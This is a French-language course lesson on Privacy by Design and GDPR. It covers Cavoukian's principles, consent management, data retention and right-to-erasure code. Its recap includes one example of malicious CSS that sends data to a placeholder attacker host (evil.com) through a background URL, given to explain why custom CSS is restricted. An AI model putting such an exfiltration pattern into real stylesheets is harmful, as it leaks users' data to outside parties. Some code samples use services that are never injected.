# Cours 61 — Privacy by Design & GDPR

> **Objectif** : Maîtriser les 7 principes de Privacy by Design de Cavoukian, implémenter les exigences GDPR en architecture (data residency, retention, pseudonymisation, droit a l'oubli), construire un CMP (Consent Management Platform), et comprendre les évolutions reglementaires (ePrivacy, DSA, EU AI Act).

---

## Rappel du cours précédent

<details>
<summary>1. Comment fonctionne le système de confiance par manifest pour les plugins ?</summary>

Le serveur envoie un **challenge HMAC** au plugin lors de l'initialisation. Le plugin signe le challenge avec son secret (enregistre a l'installation). Si la signature correspond, le plugin est déclaré trusted et ses fonctionnalités sont activees. Si 3 challenges echouent consecutivement, le plugin est auto-désactivé et l'admin est notifie.
</details>

<details>
<summary>2. Pourquoi limiter le custom CSS a 15KB et interdire certains patterns ?</summary>

Le custom CSS est exécuté dans le navigateur de l'utilisateur final — un CSS malveillant peut : casser le layout (`* { display: none }`), exfiltrer des données (`background: url(evil.com?data=...)`), overrider les design tokens (`!important` sur des variables critiques), ou importer des ressources externes (`@import url(...)`). Le scope `#site-root` + les interdictions + la taille limitee confinent l'impact.
</details>

---

## Analogie — Le coffre-fort de l'hopital

Un hopital ne stocke pas les dossiers patients n'importe comment :
- **Minimisation** : seules les infos nécessaires au traitement sont collectees (pas la couleur préférée)
- **Retention** : les dossiers sont detruits après N annees (pas gardes "au cas où")
- **Consentement** : le patient signe un formulaire AVANT tout examen
- **Droit d'accès** : le patient peut demander son dossier a tout moment
- **Droit a l'oubli** : le patient peut demander la destruction de ses données

La GDPR transpose ces principes au numérique. Le **Privacy by Design** dit qu'on ne les ajoute pas après coup — on les intégré des la conception.

---

## Théorie

### 1. Les 7 principes de Privacy by Design (Cavoukian)

| # | Principe | Application technique |
|---|---|---|
| 1 | **Proactif, pas réactif** | Threat model STRIDE inclut les risques vie privee |
| 2 | **Privacy par defaut** | Opt-in (pas opt-out), minimum de données collectees |
| 3 | **Privacy intégrée au design** | Architecture pensee privacy-first, pas bolt-on |
| 4 | **Fonctionnalite complete** | Privacy ET fonctionnalité — pas l'un au detriment de l'autre |
| 5 | **Sécurité de bout en bout** | Chiffrement at-rest + in-transit, pseudonymisation |
| 6 | **Visibilite et transparence** | Audit logs, politique de confidentialite claire |
| 7 | **Respect de l'utilisateur** | Consentement granulaire, droit d'accès, portabilite |

### 2. GDPR — exigences architecturales

```
┌─────────────────────────────────────────────────────┐
│              GDPR Architecture Checklist             │
│                                                      │
│  Data Residency :                                    │
│  ├── Stockage EU uniquement (region AWS/GCP)         │
│  ├── Pas de transfert hors EU sans adequacy decision │
│  └── Backup cross-region : EU only                   │
│                                                      │
│  Retention :                                         │
│  ├── Logs : 90 jours max                             │
│  ├── Analytics : anonymise ou supprime a 24 mois     │
│  ├── Comptes inactifs : alerte a 12 mois, purge 24   │
│  └── Pas de "on garde tout au cas ou"                │
│                                                      │
│  Pseudonymisation :                                  │
│  ├── PII jamais dans les logs (hash SHA-256)         │
│  ├── Analytics PII-free (session = randomUUID)       │
│  └── Emails : hash en DB analytique                  │
│                                                      │
│  Droit a l'oubli :                                   │
│  ├── DELETE /api/users/:id/data → soft delete        │
│  ├── Purge PII (nom, email, tel) → "DELETED_USER"   │
│  ├── Conserver historique anonymise (stats)           │
│  └── Propager aux sous-traitants (API calls)         │
└─────────────────────────────────────────────────────┘
```

### 3. Consent Management Platform (CMP)

| Categorie | Exemples | Defaut |
|---|---|---|
| **Strictement nécessaire** | Session, CSRF, auth | Toujours actif (pas de consentement) |
| **Fonctionnel** | Langue, theme, préférences | Opt-in |
| **Analytique** | Matomo, Google Analytics | Opt-in |
| **Marketing** | Facebook Pixel, retargeting | Opt-in |

```
Regle d'or : AUCUN script non-necessaire avant consentement.

Utilisateur arrive → CMP banner s'affiche
  ├── Accepte tout → scripts analytique + marketing charges
  ├── Personnalise → coche analytique, decoche marketing
  ├── Refuse tout → aucun script non-necessaire
  └── Ferme la banner → aucun script (strict mode)

Consentement stocke :
  ├── Cookie first-party (cote client)
  └── Audit log serveur (cote API — preuve legale)
```

### 4. PII-free analytics

```
Approche classique (problematique) :
  userId: "user-123" → PII, traçable, GDPR-sensible

Approche PII-free :
  sessionId: crypto.randomUUID() → genere a chaque session
  → Pas de tracking cross-session
  → Pas de PII stockee
  → GDPR-compliant par construction
```

### 5. Evolutions reglementaires

| Regulation | Scope | Impact architecture |
|---|---|---|
| **GDPR** (2018) | Données personnelles EU | Consentement, retention, droit a l'oubli |
| **ePrivacy** (en cours) | Cookies, communications | CMP plus strict, cookie walls interdits |
| **DSA** (2024) | Contenus plateformes | Moderation, transparence algorithmes |
| **EU AI Act** (2024) | Systèmes IA | Risk register, audit trail, explainability |

---

## Pratique

### Service de droit a l'oubli

```typescript
@Injectable()
export class GdprService {
  constructor(
    private readonly userRepo: UserRepository,
    private readonly orderRepo: OrderRepository,
    private readonly auditLog: AuditLogService,
  ) {}

  async executeRightToErasure(userId: string): Promise<ErasureReport> {
    const report: ErasureReport = {
      userId,
      requestedAt: new Date(),
      actions: [],
    };

    // 1. Pseudonymiser les donnees utilisateur
    await this.userRepo.pseudonymize(userId, {
      firstName: 'DELETED',
      lastName: 'USER',
      email: `deleted-${crypto.randomUUID()}@erased.local`,
      phone: null,
      address: null,
    });
    report.actions.push('user_pseudonymized');

    // 2. Anonymiser les commandes (conserver pour comptabilite)
    await this.orderRepo.anonymizeByUser(userId);
    report.actions.push('orders_anonymized');

    // 3. Supprimer les sessions et tokens
    await this.sessionStore.deleteByUser(userId);
    report.actions.push('sessions_deleted');

    // 4. Propager aux sous-traitants
    await this.notifySubProcessors(userId);
    report.actions.push('sub_processors_notified');

    // 5. Log d'audit (sans PII !)
    await this.auditLog.record({
      action: 'gdpr.erasure',
      subjectId: userId, // L'ID reste pour tracabilite
      performedAt: new Date(),
      result: 'completed',
    });

    return report;
  }
}
```

### CMP implémentation

```typescript
// Types de consentement
interface ConsentState {
  necessary: true; // Toujours vrai, pas modifiable
  functional: boolean;
  analytics: boolean;
  marketing: boolean;
  updatedAt: string; // ISO 8601
  version: string;   // Version de la politique
}

// Cookie first-party + audit log serveur
class ConsentManager {
  private readonly COOKIE_NAME = 'consent_preferences';
  private readonly POLICY_VERSION = '2024-03-01';

  getConsent(): ConsentState | null {
    const cookie = getCookie(this.COOKIE_NAME);
    if (!cookie) return null;

    const consent = JSON.parse(cookie) as ConsentState;

    // Si la version de la politique a change → re-demander
    if (consent.version !== this.POLICY_VERSION) return null;

    return consent;
  }

  async setConsent(preferences: Partial<ConsentState>): Promise<void> {
    const consent: ConsentState = {
      necessary: true,
      functional: preferences.functional ?? false,
      analytics: preferences.analytics ?? false,
      marketing: preferences.marketing ?? false,
      updatedAt: new Date().toISOString(),
      version: this.POLICY_VERSION,
    };

    // 1. Cookie first-party (client-side)
    setCookie(this.COOKIE_NAME, JSON.stringify(consent), {
      maxAge: 365 * 24 * 60 * 60, // 1 an
      sameSite: 'strict',
      secure: true,
    });

    // 2. Audit log serveur (preuve legale)
    await fetch('/api/consent', {
      method: 'POST',
      body: JSON.stringify(consent),
    });

    // 3. Activer/desactiver les scripts
    this.applyConsent(consent);
  }

  private applyConsent(consent: ConsentState): void {
    // Charger les scripts uniquement si consentement
    if (consent.analytics) {
      this.loadScript('matomo', '/scripts/matomo.js');
    }
    if (consent.marketing) {
      this.loadScript('facebook', '/scripts/fb-pixel.js');
    }
  }
}
```

### Data retention job

```typescript
@Injectable()
export class DataRetentionJob {
  constructor(
    private readonly db: DataSource,
    private readonly logger: Logger,
  ) {}

  // Execute chaque nuit via cron
  async execute(): Promise<RetentionReport> {
    const report: RetentionReport = { deletedLogs: 0, anonymizedUsers: 0 };

    // 1. Purger les logs > 90 jours
    const logResult = await this.db.query(
      `DELETE FROM audit_logs WHERE created_at < NOW() - INTERVAL '90 days'`,
    );
    report.deletedLogs = logResult.affected ?? 0;

    // 2. Alerter les utilisateurs inactifs > 12 mois
    const inactiveUsers = await this.db.query(
      `SELECT id, email FROM users
       WHERE last_login_at < NOW() - INTERVAL '12 months'
       AND inactive_notice_sent = false`,
    );
    for (const user of inactiveUsers) {
      await this.sendInactivityNotice(user);
    }

    // 3. Anonymiser les comptes inactifs > 24 mois
    const expiredUsers = await this.db.query(
      `SELECT id FROM users
       WHERE last_login_at < NOW() - INTERVAL '24 months'
       AND status != 'anonymized'`,
    );
    for (const user of expiredUsers) {
      await this.gdprService.executeRightToErasure(user.id);
      report.anonymizedUsers++;
    }

    this.logger.info('data_retention_completed', report);
    return report;
  }
}
```

---

## Résumé

1. **Privacy by Design** (7 principes Cavoukian) : intégrer la vie privee des la conception, pas en bolt-on
2. **GDPR architecture** : data residency EU, retention 90j logs, pseudonymisation PII, droit a l'oubli technique (propager aux sous-traitants)
3. **CMP** : consentement par categorie, aucun script avant consentement, cookie first-party + audit log serveur
4. **PII-free analytics** : `crypto.randomUUID()` par session, pas de tracking cross-session, GDPR-compliant par construction
5. **Evolutions** : ePrivacy (cookies), DSA (contenus), EU AI Act (risk register + audit trail)

---

> **Prochain cours** : [Cours 62 — Caching multi-niveaux](../09-performance-scalabilité/01-caching-multi-niveaux.md)

---

> **Lien fil rouge — ShopArch**
>
> - Implémente le CMP (Consent Management Platform) pour conditionner les analytics ShopArch
> - Vérifie la conformité RGPD : droit à l'effacement, portabilité des données
> - Exercice(s) associé(s) : `exercices/41-implementer-cmp/`
> - Checkpoint : Module 08, critère 4

---

<!-- parcours-recommande -->

::: tip Parcours recommandé
1. **Exercice** : [37-threat-model-stride](../../exercices/37-threat-model-stride/ENONCE)
2. **Exercice** : [38-sécuriser-api](../../exercices/38-securiser-api/ENONCE)
3. **Exercice** : [39-csp-hash-only](../../exercices/39-csp-hash-only/ENONCE)
4. **Exercice** : [40-audit-sécurité](../../exercices/40-audit-securite/ENONCE)
5. **Exercice** : [41-implementer-cmp](../../exercices/41-implementer-cmp/ENONCE)
:::
